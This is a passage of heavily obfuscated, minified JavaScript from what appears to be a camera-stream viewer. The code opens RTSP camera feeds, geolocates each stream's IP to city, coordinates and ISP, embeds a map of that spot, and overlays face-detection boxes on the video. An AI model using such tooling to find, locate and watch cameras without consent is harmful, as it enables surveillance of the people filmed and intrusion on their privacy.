x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3><i\x20class=\x22fas\x20fa-globe\x22></i>\x20Location</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>City:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>'+(_0x36363a[_0x2379a3(0x2f2)]||_0x2379a3(0x37a))+_0x2379a3(0x352)+(_0x36363a['regionName']||_0x2379a3(0x37a))+_0x2379a3(0x19d)+(_0x36363a[_0x2379a3(0x3c3)]||_0x2379a3(0x37a))+'\x20'+(_0x36363a[_0x2379a3(0x45b)]?'('+_0x36363a[_0x2379a3(0x45b)]+')':'')+_0x2379a3(0x366)+(_0x36363a[_0x2379a3(0x1d1)]||_0x2379a3(0x37a))+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>Coordinates:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>'+(_0x36363a[_0x2379a3(0x28b)]?_0x36363a[_0x2379a3(0x28b)][_0x2379a3(0x22c)](0x4):'?')+',\x20'+(_0x36363a['lon']?_0x36363a[_0x2379a3(0x277)][_0x2379a3(0x22c)](0x4):'?')+_0x2379a3(0x1b0)+(_0x36363a[_0x2379a3(0x247)]||_0x2379a3(0x37a))+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>Organization:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>'+(_0x36363a['org']||_0x2379a3(0x37a))+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>AS:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>'+(_0x36363a['as']||_0x2379a3(0x37a))+_0x2379a3(0x1c9)+_0x3a3f8c+_0x2379a3(0x40c)+(_0x1f4d1e?_0x2379a3(0x3dd):_0x2379a3(0x48b))+_0x2379a3(0x21a)+(_0x36363a['proxy']?_0x2379a3(0x1ef):'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(_0x36363a['hosting']?'<i\x20class=\x22fas\x20fa-server\x22></i>\x20Hosting':'')+_0x2379a3(0x21a)+(_0x36363a[_0x2379a3(0x2b3)]?_0x2379a3(0x445):'')+_0x2379a3(0x381);}const _0x139587=_0x3d2108['querySelector'](_0x2379a3(0x440));if(_0x139587&&_0x36363a[_0x2379a3(0x28b)]&&_0x36363a[_0x2379a3(0x277)])_0x139587['innerHTML']=_0x2379a3(0x45c)+_0x36363a[_0x2379a3(0x28b)]+','+_0x36363a[_0x2379a3(0x277)]+_0x2379a3(0x42d)+(_0x36363a['district']||'')+'%20Street%2C%20'+(_0x36363a['city']||'')+_0x2379a3(0x44f)+(_0x36363a['regionName']||'')+'&amp;ie=UTF8&amp;t=&amp;z=14&amp;iwloc=B&amp;output=embed\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20allowfullscreen>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</iframe>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';else _0x139587&&(_0x139587[_0x2379a3(0x2af)]='<div\x20class=\x22map-placeholder\x22>Map\x20data\x20not\x20available</div>');globalState['advancedMode']&&(updateDashboardContent(),globalState[_0x2379a3(0x433)]===_0x1a80c8&&updateCurrentIpDisplay());},updateGoogleMaps=(_0x5033ca,_0x332c35,_0x66a36a,_0x2a95f1,_0x36de5f,_0x569452)=>{const _0x3da069=_0x5d7fa7;if(!_0x5033ca||!_0x332c35||!_0x569452)return;const _0x4a3d21=_0x569452['querySelector'](_0x3da069(0x440));if(!_0x4a3d21)return;const _0x1f7e25=[_0x66a36a,_0x2a95f1,_0x36de5f][_0x3da069(0x3d4)](Boolean)[_0x3da069(0x374)](',\x20');_0x4a3d21[_0x3da069(0x2af)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<iframe\x20width=\x22100%\x22\x20height=\x22100%\x22\x20frameborder=\x220\x22\x20style=\x22border:0\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20src=\x22https://maps.google.com/maps?width=100%&amp;height=600&amp;hl=en&amp;coord='+_0x5033ca+','+_0x332c35+_0x3da069(0x42d)+_0x66a36a+_0x3da069(0x3d0)+_0x2a95f1+'%2C%20'+_0x36de5f+_0x3da069(0x1a6);},initFaceDetection=async(_0x56fc29,_0x5eb047)=>{const _0x21d866=_0x5d7fa7;if(!_0x56fc29||!_0x5eb047||!window[_0x21d866(0x3d7)])return;try{await Promise[_0x21d866(0x458)]([faceapi[_0x21d866(0x20f)][_0x21d866(0x324)][_0x21d866(0x46f)](_0x21d866(0x233)),faceapi[_0x21d866(0x20f)][_0x21d866(0x33d)][_0x21d866(0x46f)]('/models'),faceapi['nets'][_0x21d866(0x257)]['loadFromUri'](_0x21d866(0x233))]);const _0x121d4c=setInterval(async()=>{const _0x4f8533=_0x21d866,_0x549688=document['getElementById'](_0x4f8533(0x23f));if(!_0x549688||!_0x549688['checked']){_0x5eb047[_0x4f8533(0x2af)]='';return;}if(!document['body'][_0x4f8533(0x26b)](_0x56fc29)||!document[_0x4f8533(0x27f)]['contains'](_0x5eb047)){clearInterval(_0x121d4c);return;}try{const _0x5d0e32=await faceapi[_0x4f8533(0x3db)](_0x56fc29,new faceapi['TinyFaceDetectorOptions']());_0x5eb047[_0x4f8533(0x2af)]='',_0x5d0e32[_0x4f8533(0x222)](_0x3f6d18=>{const _0x371715=_0x4f8533,{x:_0xaa9980,y:_0x4a8155,width:_0x56d64d,height:_0x1e3390}=_0x3f6d18[_0x371715(0x44c)],_0x30057a=document[_0x371715(0x21c)](_0x371715(0x1df));_0x30057a[_0x371715(0x259)]=_0x371715(0x3cd),_0x30057a[_0x371715(0x270)][_0x371715(0x173)]=_0xaa9980+'px',_0x30057a[_0x371715(0x270)][_0x371715(0x132)]=_0x4a8155+'px',_0x30057a[_0x371715(0x270)][_0x371715(0x219)]=_0x56d64d+'px',_0x30057a[_0x371715(0x270)]['height']=_0x1e3390+'px',_0x5eb047[_0x371715(0x301)](_0x30057a);});}catch(_0x47de78){console[_0x4f8533(0x473)](_0x4f8533(0x1aa),_0x47de78);}},0x7d0);}catch(_0x5dc2e1){console[_0x21d866(0x473)](_0x21d866(0x1b9),_0x5dc2e1);}},openAdvancedDashboard=()=>{const _0xd26925=_0x5d7fa7;if(document[_0xd26925(0x1e8)]('advancedDashboard'))return;globalState['advancedMode']=!![];const _0x107ba6=document[_0xd26925(0x1e8)](_0xd26925(0x1ab)),_0x43b371=_0x107ba6[_0xd26925(0x3a9)]['cloneNode'](!![])['querySelector']('.advanced-dashboard'),_0x2aee90=window[_0xd26925(0x41e)],_0x498e51=window[_0xd26925(0x13d)];_0x43b371[_0xd26925(0x270)]['top']=(_0x498e51-0x258)/0x2+'px',_0x43b371['style'][_0xd26925(0x173)]=(_0x2aee90-0x384)/0x2+'px',document['body']['appendChild'](_0x43b371),makeDraggable(_0x43b371,_0x43b371[_0xd26925(0x3b0)]('.window-titlebar')),setupWindowControls(_0x43b371),setupDashboardNavigation(_0x43b371),updateDashboardContent(),setupCurrentIPFunctionality(),updateAdvancedModeTime(),setInterval(updateAdvancedModeTime,0x3e8);const _0x2f582a=_0x43b371[_0xd26925(0x3b0)](_0xd26925(0x307)),_0x2811c7=_0x43b371[_0xd26925(0x3b0)]('.nav-item[data-section=\x22api-endpoints\x22]');_0x2f582a&&_0x2811c7&&(_0x2811c7[_0xd26925(0x272)]['remove'](_0xd26925(0x22e)),_0x43b371[_0xd26925(0x3b0)](_0xd26925(0x286))[_0xd26925(0x272)][_0xd26925(0x294)](_0xd26925(0x22e)),_0x2f582a[_0xd26925(0x272)][_0xd26925(0x3dc)]('active'),_0x43b371[_0xd26925(0x3b0)](_0xd26925(0x27d))[_0xd26925(0x272)][_0xd26925(0x3dc)](_0xd26925(0x22e)));},closeAdvancedDashboard=()=>{const _0x378c56=_0x5d7fa7,_0x4bd896=document['getElementById']('advancedDashboard');_0x4bd896&&(_0x4bd896['classList'][_0x378c56(0x3dc)]('closing'),setTimeout(()=>{_0x4bd896['remove'](),globalState['advancedMode']=![];},0x12c));},setupDashboardNavigation=_0x4b816a=>{const _0x1aec8c=_0x5d7fa7,_0x48e5ff=_0x4b816a[_0x1aec8c(0x416)](_0x1aec8c(0x279));_0x48e5ff[_0x1aec8c(0x222)](_0x3789b7=>{const _0x2c8db4=_0x1aec8c;_0x3789b7['addEventListener'](_0x2c8db4(0x2bd),()=>{const _0x26a060=_0x2c8db4;_0x48e5ff[_0x26a060(0x222)](_0xec929e=>_0xec929e['classList']['remove'](_0x26a060(0x22e))),_0x3789b7['classList'][_0x26a060(0x3dc)](_0x26a060(0x22e));const _0x46b40e=_0x3789b7[_0x26a060(0x1d4)]['section'],_0x5bdc05=_0x4b816a['querySelectorAll'](_0x26a060(0x1e0));_0x5bdc05[_0x26a060(0x222)](_0x5546b2=>_0x5546b2['classList'][_0x26a060(0x294)](_0x26a060(0x22e)));const _0xe17ddc=_0x4b816a['querySelector']('#'+_0x46b40e);_0xe17ddc&&_0xe17ddc[_0x26a060(0x272)][_0x26a060(0x3dc)](_0x26a060(0x22e));});});},updateDashboardContent=()=>{updateApiEndpointsSection(),updateStateSection(),updateCameraDataSection(),populateCurrentIpSelector(),updateCurrentIpDisplay();},updateApiEndpointsSection=()=>{const _0x44a11e=_0x5d7fa7,_0x1f7e3e=document['getElementById']('ipInfoEndpoint');_0x1f7e3e&&(_0x1f7e3e[_0x44a11e(0x43f)]=API_ENDPOINTS[_0x44a11e(0x287)]+_0x44a11e(0x33f)+API_ENDPOINTS['IP_INFO_FIELDS']);const _0x346709=document['getElementById'](_0x44a11e(0x3a2));_0x346709&&(_0x346709[_0x44a11e(0x43f)]=API_ENDPOINTS[_0x44a11e(0x476)]+'{asn}/json');const _0x49c68c=document['getElementById'](_0x44a11e(0x357));_0x49c68c&&(_0x49c68c[_0x44a11e(0x43f)]=API_ENDPOINTS[_0x44a11e(0x323)]);},updateStateSection=()=>{const _0x4131a4=_0x5d7fa7,_0x24b681=document[_0x4131a4(0x1e8)]('globalStateView');if(_0x24b681){const _0x24f96c={...globalState};_0x24f96c[_0x4131a4(0x306)]&&_0x24f96c[_0x4131a4(0x306)]['length']>0x0&&(_0x24f96c[_0x4131a4(0x306)]='[Array('+_0x24f96c[_0x4131a4(0x306)][_0x4131a4(0x326)]+_0x4131a4(0x314)),_0x24b681[_0x4131a4(0x43f)]=JSON[_0x4131a4(0x1a8)](_0x24f96c,null,0x2);}},updateCameraDataSection=()=>{const _0x2fc10c=_0x5d7fa7,_0x343e25=document[_0x2fc10c(0x1e8)](_0x2fc10c(0x3f2));if(!_0x343e25)return;_0x343e25[_0x2fc10c(0x2af)]='',globalState[_0x2fc10c(0x14c)][_0x2fc10c(0x222)](_0x4b73c1=>{const _0x48e342=_0x2fc10c,_0x5b1eef=document['querySelector'](_0x48e342(0x216)+_0x4b73c1+'\x22]');if(!_0x5b1eef)return;const _0x356a2e=_0x5b1eef['dataset'][_0x48e342(0x134)],_0x23941c=globalState['rawData'][_0x48e342(0x418)][_0x4b73c1],_0x10b177=globalState['rawData'][_0x48e342(0x1fd)][_0x4b73c1],_0x9a1ef4=document[_0x48e342(0x21c)](_0x48e342(0x1df));_0x9a1ef4[_0x48e342(0x259)]=_0x48e342(0x3b2);let _0x97bd42='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22camera-data-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-video\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h4>'+(_0x356a2e||_0x48e342(0x1ac))+_0x48e342(0x452);_0x23941c?_0x97bd42+=_0x48e342(0x3a3)+(_0x23941c[_0x48e342(0x178)]||_0x48e342(0x37a))+_0x48e342(0x432)+(_0x23941c[_0x48e342(0x2f2)]||'Unknown')+',\x20'+(_0x23941c[_0x48e342(0x3c3)]||'')+_0x48e342(0x271)+(_0x23941c['as']||_0x48e342(0x37a))+_0x48e342(0x41a):_0x97bd42+='<p>No\x20IP\x20data\x20available</p>',_0x97bd42+=_0x48e342(0x16c),_0x9a1ef4[_0x48e342(0x2af)]=_0x97bd42,_0x343e25[_0x48e342(0x301)](_0x9a1ef4);}),globalState['activeWindows']['length']===0x0&&(_0x343e25[_0x2fc10c(0x2af)]='<p>No\x20active\x20cameras\x20to\x20display</p>');},updateConsoleOutput=()=>{const _0x4e1216=_0x5d7fa7,_0x1d43de=document['getElementById']('consoleOutput');if(!_0x1d43de)return;_0x1d43de['innerHTML']='';const _0x329ae2=globalState[_0x4e1216(0x306)][_0x4e1216(0x49a)](-0x32);_0x329ae2['forEach'](_0xf957d0=>{const _0x271d69=_0x4e1216,_0x5419bb=document[_0x271d69(0x21c)](_0x271d69(0x1df));_0x5419bb['className']=_0x271d69(0x217);const _0x4a3139=document['createElement'](_0x271d69(0x468));_0x4a3139[_0x271d69(0x259)]=_0x271d69(0x359),_0x4a3139[_0x271d69(0x43f)]='['+_0xf957d0['time'][_0x271d69(0x388)]()+']';const _0x103326=document[_0x271d69(0x21c)](_0x271d69(0x468));_0x103326['className']='console-type\x20'+_0xf957d0[_0x271d69(0x1d6)],_0x103326[_0x271d69(0x43f)]=_0xf957d0['type']['toUpperCase']();const _0x5b2ff6=document[_0x271d69(0x21c)](_0x271d69(0x468));_0x5b2ff6[_0x271d69(0x259)]=_0x271d69(0x25c),_0x5b2ff6['textContent']=_0xf957d0['message'],_0x5419bb[_0x271d69(0x301)](_0x4a3139),_0x5419bb['appendChild'](_0x103326),_0x5419bb['appendChild'](_0x5b2ff6),_0x1d43de['appendChild'](_0x5419bb);}),_0x1d43de['scrollTop']=_0x1d43de[_0x4e1216(0x194)];},updateAdvancedModeTime=()=>{const _0x5651c5=_0x5d7fa7,_0x4d8f79=document[_0x5651c5(0x1e8)](_0x5651c5(0x391));if(_0x4d8f79){const _0x197055=new Date();_0x4d8f79[_0x5651c5(0x43f)]=_0x197055[_0x5651c5(0x388)]();}},populateCurrentIpSelector=()=>{const _0x3765d8=_0x5d7fa7,_0x31d7e1=document[_0x3765d8(0x1e8)](_0x3765d8(0x2c5));if(!_0x31d7e1)return;const _0x516836=_0x31d7e1['value'];_0x31d7e1[_0x3765d8(0x2af)]=_0x3765d8(0x24a),globalState[_0x3765d8(0x14c)][_0x3765d8(0x222)](_0x576af2=>{const _0x446200=_0x3765d8,_0x915e1=document[_0x446200(0x3b0)]('.window[data-id=\x22'+_0x576af2+'\x22]');if(!_0x915e1)return;const _0x4ed735=_0x915e1['dataset'][_0x446200(0x134)];if(!_0x4ed735)return;const _0x5f350b=document[_0x446200(0x21c)](_0x446200(0x2d9));_0x5f350b[_0x446200(0x1a5)]=_0x576af2,_0x5f350b[_0x446200(0x43f)]=_0x4ed735,_0x576af2===_0x516836&&(_0x5f350b[_0x446200(0x3fc)]=!![]),_0x31d7e1[_0x446200(0x301)](_0x5f350b);}),!_0x31d7e1[_0x3765d8(0x1a5)]&&globalState['activeWindows'][_0x3765d8(0x326)]>0x0&&(_0x31d7e1['value']=globalState['activeWindows'][0x0]),_0x31d7e1[_0x3765d8(0x1a5)]&&(globalState[_0x3765d8(0x433)]=_0x31d7e1[_0x3765d8(0x1a5)],updateCurrentIpDisplay());},updateCurrentIpDisplay=()=>{const _0x2caca1=_0x5d7fa7,_0x200717=globalState[_0x2caca1(0x433)];if(!_0x200717)return;const _0x45596a=document[_0x2caca1(0x3b0)](_0x2caca1(0x216)+_0x200717+'\x22]');if(!_0x45596a)return;const _0x81f20=_0x45596a['dataset'][_0x2caca1(0x134)],_0x458440=globalState[_0x2caca1(0x333)][_0x2caca1(0x418)][_0x200717],_0x1a70ae=globalState[_0x2caca1(0x333)]['asnInfo'][_0x200717],_0x2e1472=document[_0x2caca1(0x1e8)](_0x2caca1(0x1c2));_0x2e1472&&(_0x2e1472[_0x2caca1(0x43f)]=_0x458440?_0x458440[_0x2caca1(0x178)]:extractIpFromUrl(_0x81f20)||'Unknown\x20IP');const _0x5d47a7=document[_0x2caca1(0x1e8)](_0x2caca1(0x164));if(_0x5d47a7&&_0x458440)_0x5d47a7[_0x2caca1(0x43f)]=(_0x458440[_0x2caca1(0x2f2)]||'')+',\x20'+(_0x458440[_0x2caca1(0x2dc)]||'')+',\x20'+(_0x458440['country']||'');else _0x5d47a7&&(_0x5d47a7['textContent']='');const _0x37358a=document[_0x2caca1(0x1e8)](_0x2caca1(0x174));if(_0x37358a&&_0x458440)_0x37358a[_0x2caca1(0x2af)]=_0x2caca1(0x221)+(_0x458440[_0x2caca1(0x247)]||'Unknown')+_0x2caca1(0x477)+(_0x458440[_0x2caca1(0x1b4)]||_0x2caca1(0x37a))+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>AS:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>'+(_0x458440['as']||_0x2caca1(0x37a))+_0x2caca1(0x409)+(_0x458440[_0x2caca1(0x2b3)]?_0x2caca1(0x192):'No')+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Proxy:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>'+(_0x458440[_0x2caca1(0x1c3)]?_0x2caca1(0x192):'No')+_0x2caca1(0x256)+(_0x458440['hosting']?_0x2caca1(0x192):'No')+_0x2caca1(0x21b);else _0x37358a&&(_0x37358a[_0x2caca1(0x2af)]='<p>No\x20network\x20data\x20available</p>');const _0x964f70=document[_0x2caca1(0x1e8)](_0x2caca1(0x2a5));if(_0x964f70&&_0x458440)_0x964f70['innerHTML']=_0x2caca1(0x425)+(_0x458440[_0x2caca1(0x2f2)]||_0x2caca1(0x37a))+_0x2caca1(0x3da)+(_0x458440[_0x2caca1(0x2dc)]||_0x2caca1(0x37a))+_0x2caca1(0x42a)+(_0x458440[_0x2caca1(0x3c3)]||_0x2caca1(0x37a))+_0x2caca1(0x29e)+(_0x458440[_0x2caca1(0x3ac)]||'Unknown')+_0x2caca1(0x20d)+(_0x458440[_0x2caca1(0x1d1)]||_0x2caca1(0x37a))+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Lat/Long:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>'+(_0x458440[_0x2caca1(0x28b)]||'?')+',\x20'+(_0x458440[_0x2caca1(0x277)]||'?')+_0x2caca1(0x21b);else _0x964f70&&(_0x964f70[_0x2caca1(0x2af)]=_0x2caca1(0x1ee));const _0x24a836=document[_0x2caca1(0x1e8)](_0x2caca1(0x3d8));if(_0x24a836&&_0x1a70ae)_0x24a836[_0x2caca1(0x2af)]=_0x2caca1(0x48d)+(_0x458440?.['as']||_0x2caca1(0x37a))+_0x2caca1(0x297)+(_0x458440?.[_0x2caca1(0x244)]||'Unknown')+_0x2caca1(0x229)+(_0x1a70ae?.[_0x2caca1(0x1eb)]||_0x2caca1(0x37a))+_0x2caca1(0x23e)+(_0x1a70ae?.[_0x2caca1(0x1b4)]||'Unknown')+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';else _0x24a836&&(_0x24a836[_0x2caca1(0x2af)]=_0x2caca1(0x378));const _0x8f13c5=document['getElementById']('currentIpStreamDetails');_0x8f13c5&&(_0x8f13c5[_0x2caca1(0x2af)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>URL:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>'+(_0x81f20||'Unknown')+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22detail-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-label\x22>Type:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22detail-value\x22>'+(_0x81f20?.[_0x2caca1(0x3df)]('rtsp://')?_0x2caca1(0x371):_0x2caca1(0x201))+_0x2caca1(0x449)+(_0x45596a[_0x2caca1(0x3b0)](_0x2caca1(0x1ed))?.['textContent']||_0x2caca1(0x37a))+_0x2caca1(0x21b));const _0x5cc2c6=document['getElementById'](_0x2caca1(0x182));if(_0x5cc2c6&&_0x458440&&_0x458440[_0x2caca1(0x28b)]&&_0x458440['lon'])_0x5cc2c6['innerHTML']=_0x2caca1(0x3fb)+_0x458440[_0x2caca1(0x28b)]+','+_0x458440['lon']+_0x2caca1(0x42d)+(_0x458440[_0x2caca1(0x2c9)]||'')+_0x2caca1(0x3d0)+(_0x458440['city']||'')+_0x2caca1(0x44f)+(_0x458440[_0x2caca1(0x2dc)]||'')+'&amp;ie=UTF8&amp;t=&amp;z=14&amp;iwloc=B&amp;output=embed\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20allowfullscreen></iframe>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';else _0x5cc2c6&&(_0x5cc2c6['innerHTML']='<p>Map\x20data\x20not\x20available</p>');},setupResolutionControls=()=>{const _0x3e1581=_0x5d7fa7,_0x361149=document['getElementById'](_0x3e1581(0x3ea)),_0x1e8ae9=document[_0x3e1581(0x1e8)](_0x3e1581(0x2b1)),_0x5b67b9=document[_0x3e1581(0x1e8)](_0x3e1581(0x2db)),_0x3b579b=document['getElementById'](_0x3e1581(0x43e));_0x361149&&(_0x361149[_0x3e1581(0x243)]=globalState['autoResolution'],_0x1e8ae9[_0x3e1581(0x270)][_0x3e1581(0x252)]=globalState['autoResolution']?_0x3e1581(0x3b1):_0x3e1581(0x31e),_0x361149['addEventListener'](_0x3e1581(0x3ce),_0x2958f2=>{const _0x236f16=_0x3e1581;globalState[_0x236f16(0x354)]=_0x2958f2['target']['checked'],_0x1e8ae9[_0x236f16(0x270)][_0x236f16(0x252)]=globalState['autoResolution']?_0x236f16(0x3b1):'flex',globalState[_0x236f16(0x354)]&&globalState[_0x236f16(0x14c)][_0x236f16(0x222)](_0x1f33b8=>{const _0x2c3d21=_0x236f16,_0x2b91f4=document[_0x2c3d21(0x3b0)](_0x2c3d21(0x216)+_0x1f33b8+'\x22]');if(_0x2b91f4){const _0x4f2115=_0x2b91f4['querySelector'](_0x2c3d21(0x330)),_0x1909a8=_0x2b91f4[_0x2c3d21(0x1d4)]['streamUrl'];if(_0x1909a8?.['startsWith']('rtsp://')&&_0x4f2115){const _0x599995=calculateOptimalResolution(_0x4f2115['clientWidth'],_0x4f2115[_0x2c3d21(0x355)]);updateRtspStreamResolution(_0x2b91f4,_0x1909a8,_0x599995);}}});}));if(_0x5b67b9){const _0x51e178=_0x5b67b9['querySelectorAll'](_0x3e1581(0x2d9));for(const _0x189f7a of _0x51e178){if(_0x189f7a[_0x3e1581(0x1a5)]===globalState['manualResolution']){_0x189f7a[_0x3e1581(0x3fc)]=!![];break;}}}_0x3b579b&&_0x3b579b[_0x3e1581(0x28f)](_0x3e1581(0x2bd),()=>{const _0x6ae14b=_0x3e1581;if(!_0x5b67b9||!_0x5b67b9[_0x6ae14b(0x1a5)])return;globalState['manualResolution']=_0x5b67b9[_0x6ae14b(0x1a5)],globalState['activeWindows'][_0x6ae14b(0x222)](_0x3b20c5=>{const _0x3b817c=_0x6ae14b,_0x1e31de=document[_0x3b817c(0x3b0)](_0x3b817c(0x216)+_0x3b20c5+'\x22]');if(_0x1e31de){const _0x4779a5=_0x1e31de['dataset']['streamUrl'];_0x4779a5?.[_0x3b817c(0x3df)](_0x3b817c(0x37d))&&updateRtspStreamResolution(_0x1e31de,_0x4779a5,globalState[_0x3b817c(0x2db)]);}}),updateCurrentIpDisplay();});},calculateOptimalResolution=(_0x208ea2,_0x123e5c)=>{const _0x378da4=_0x5d7fa7,_0x4364dc=Math[_0x378da4(0x40e)](_0x208ea2,0x140),_0x104076=Math[_0x378da4(0x40e)](_0x123e5c,0xf0),_0x53d51f=Math['round'](_0x4364dc/0x10)*0x10,_0x5b1928=Math[_0x378da4(0x41d)](_0x104076/0x10)*0x10;return _0x53d51f+'x'+_0x5b1928;},updateRtspStreamResolution=(_0x239771,_0x1687ab,_0x2e96fa)=>{const _0x1b45f0=_0x5d7fa7;if(!_0x239771||!_0x1687ab||!_0x2e96fa)return;const _0x306ed8=_0x239771['querySelector'](_0x1b45f0(0x330));if(!_0x306ed8)return;const _0x3bdd10=_0x306ed8[_0x1b45f0(0x3b0)](_0x1b45f0(0x131));if(!_0x3bdd10)return;const _0x301308=_0x239771[_0x1b45f0(0x3b0)]('.player-select'),_0x45ea5d=_0x301308?_0x301308[_0x1b45f0(0x1a5)]:globalState[_0x1b45f0(0x245)],_0x1aad59=_0x45ea5d===_0x1b45f0(0x16f)?createStreamedianPlayer(_0x1687ab,_0x2e96fa):createFlashphonerPlayer(_0x1687ab);_0x3bdd10[_0x1b45f0(0x16b)](_0x1aad59);const _0x2a232c=_0x239771[_0x1b45f0(0x3b0)](_0x1b45f0(0x1ed));_0x2a232c&&(_0x2a232c['textContent']=_0x2e96fa);},setupResizeObserver=(_0x26a778,_0x527060,_0x2ec9b7)=>{const _0x736a3a=_0x5d7fa7;if(!_0x26a778||!_0x527060||!_0x2ec9b7)return;const _0x52c315=_0x26a778[_0x736a3a(0x1d4)]['id'];if(!_0x52c315)return;globalState[_0x736a3a(0x43c)][_0x52c315]&&(globalState[_0x736a3a(0x43c)][_0x52c315][_0x736a3a(0x1af)][_0x736a3a(0x20c)](),globalState['resizeObservers'][_0x52c315][_0x736a3a(0x4a5)]&&clearTimeout(globalState[_0x736a3a(0x43c)][_0x52c315][_0x736a3a(0x4a5)]),delete globalState[_0x736a3a(0x43c)][_0x52c315]);const _0x28a3cb=new ResizeObserver(_0x4fdb34=>{const 